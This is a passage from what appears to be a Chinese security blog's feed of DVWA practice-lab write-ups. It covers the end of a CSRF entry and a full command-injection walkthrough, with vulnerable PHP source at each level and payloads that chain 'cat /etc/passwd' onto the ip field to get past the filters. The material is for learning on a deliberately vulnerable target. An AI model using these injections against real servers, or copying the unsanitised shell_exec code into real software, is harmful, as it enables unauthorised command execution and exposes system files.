class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_current&#x27;</span> ];<br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Sanitise current password input</span><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_curr</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_curr</span> );<br><br>    <span class="hljs-comment">// Check that the current password is correct</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_curr</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>    <span class="hljs-comment">// Do both new passwords match and does the current password match the user?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &amp;&amp; ( <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">rowCount</span>() == <span class="hljs-number">1</span> ) ) &#123;<br>        <span class="hljs-comment">// It does!</span><br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass_new</span> );<br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database with new password</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_new</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:user&#x27;</span>, <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>(), PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>        <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CSRF 我们算是搞完了。攻击者目的就是在受害者不知情的情况下冒充受害者，执行恶意操作。防护方法主要有</p><ul><li>设置请求头中Referer字段，确认请求来源页面。注意这个单词的拼写，它可有些故事。</li><li>设置Token，确认请求来自知道正在做什么的用户。有点绕，也就是确认是本人有意操作。</li><li>验证码，也是确认本人有意操作。</li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>跨站请求伪造</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-command-injection</title>
    <link href="/2022/06/03/dvwa-command-injection/"/>
    <url>/2022/06/03/dvwa-command-injection/</url>
    
    <content type="html"><![CDATA[<blockquote><p>命令注入漏洞是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序，<br>并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源。<br>PHP命令注入攻击中有一些具有命令执行功能的函数,<code>system()</code> <code>exec()</code> <code>shell_exec()</code> <code>popen()</code> ,可能存在命令注入漏洞。<br>在Linux中也有一些命令连接符 <code>&amp;</code> <code>|</code> <code>&amp;&amp;</code> <code>||</code> <code>;</code>，也可能存在命令注入漏洞。</p></blockquote><h1 id="请求页面"><a href="#请求页面" class="headerlink" title="请求页面"></a>请求页面</h1><p>让我们输入IP地址，那就用 <code>127.0.0.1</code>来小试一下<br><img src="/2022/06/03/dvwa-command-injection/1691825424017.png" alt="1691825424017"></p><h1 id="响应页面"><a href="#响应页面" class="headerlink" title="响应页面"></a>响应页面</h1><p><img src="/2022/06/03/dvwa-command-injection/1691826301450.png" alt="1691826301450"></p><h1 id="low"><a href="#low" class="headerlink" title="low"></a>low</h1><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><p>看到是POST请求，参数为 <code>ip</code> <code>Submit</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vulnerabilities/exec/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>26<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/vulnerabilities/exec/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>security=low; PHPSESSID=re4k3en5q4a2e9pqidrd3it4a3; security=low<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-ini"><span class="hljs-attr">ip</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>&amp;Submit=Submit</span><br></code></pre></td></tr></table></figure><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>可以看到，代码逻辑：根据操作系统类型，执行 <code>ping</code>命令并且将结果输出到网页。没有对用户输入进行过滤，这显然是非常危险的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>可以尝试用以下命令</p><table><thead><tr><th>符号</th><th>说明</th></tr></thead><tbody><tr><td>A;B</td><td>A 不论正确与否都会执行 B 命令,顺序执行</td></tr><tr><td>A&amp;B</td><td>A 后台运行，A 和 B 同时执行</td></tr><tr><td>A&amp;&amp;B</td><td>A 执行成功时候才会执行 B 命令，逻辑与</td></tr><tr><td>A|B</td><td>A 执行的输出结果，作为 B 命令的参数，管道符号</td></tr><tr><td>A||B</td><td>A 执行失败后才会执行 B 命令，逻辑或</td></tr></tbody></table><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 ; <span class="hljs-built_in">cat</span> /etc/passwd<br>127.0.0.1 &amp; <span class="hljs-built_in">cat</span> /etc/passwd<br>127.0.0.1 &amp;&amp; <span class="hljs-built_in">cat</span> /etc/passwd<br>127.0.0.1 | <span class="hljs-built_in">cat</span> /etc/passwd<br>233 || <span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><p><code>127.0.0.1 ; cat /etc/passwd</code>  就用它吧，比较顺眼的分号，谁让它是我们常见的语句结束符;</p><p><img src="/2022/06/03/dvwa-command-injection/1691831895442.png" alt="1691831895442"></p><h1 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h1><h2 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>源码增加了对 <code>&amp;&amp;</code> <code>;</code> 这两种情况的过滤,但是仍然可以通过其他方式注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1 &amp; <span class="hljs-built_in">cat</span> /etc/passwd<br>127.0.0.1 | <span class="hljs-built_in">cat</span> /etc/passwd<br>aaa || <span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h1 id="high"><a href="#high" class="headerlink" title="high"></a>high</h1><h2 id="源码-2"><a href="#源码-2" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ]);<br><br>    <span class="hljs-comment">// Set blacklist</span><br>    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br>        <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;| &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>    );<br><br>    <span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>        <span class="hljs-comment">// Windows</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// *nix</span><br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>    &#125;<br><br>    <span class="hljs-comment">// Feedback for the end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>源码进一步增加了输入过滤替换，几乎把命令连接符通通过滤了。但是，有意思的是管道符号后有个关键的空格 <code>&#39;| &#39; =&gt; &#39;&#39;,</code>，也就是说仍然可以通过管道符号进行命令注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">127.0.0.1|<span class="hljs-built_in">cat</span> /etc/passwd<br></code></pre></td></tr></table></figure><h1 id="impossible"><a href="#impossible" class="headerlink" title="impossible"></a>impossible</h1><p>敲黑板，开始学习了！那个往外看的！</p><h2 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br>    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Split the IP into 4 octects</span><br>    <span class="hljs-variable">$octet</span> = <span class="hljs-title function_ invoke__">explode</span>( <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$target</span> );<br><br>    <span class="hljs-comment">// Check IF each octet is an integer</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">sizeof</span>( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;<br>        <span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together.</span><br>        <span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];<br><br>        <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br>            <span class="hljs-comment">// Windows</span><br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// *nix</span><br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">&#x27;ping  -c 4 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>        &#125;<br><br>        <span class="hljs-comment">// Feedback for the end user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Ops. Let the user name theres a mistake</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>可以看到，对输入的  <code>ip</code> 进行了“残忍的肢解过滤再拼接”，等同于白名单过滤了。相当于，牛来了都只能被切开变成毛肚，牛排，牛肉片，最后在火锅游啊游。怎么感觉输入不过虑像是生吃牛肉一样，不生病才怪！</p><h1 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a>总结一下</h1><p>实际上注入漏洞在很多方面都存在，比如说<strong>sql注入</strong> <strong>反序列化</strong> <strong>模板注入</strong>。根本上，注入得以实现就是利用了输入过滤的疏忽，可以这么说，注入是输入过滤的漏网之鱼。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa-brute-force</title>
    <link href="/2022/06/03/dvwa-brute-force/"/>
    <url>/2022/06/03/dvwa-brute-force/</url>
    
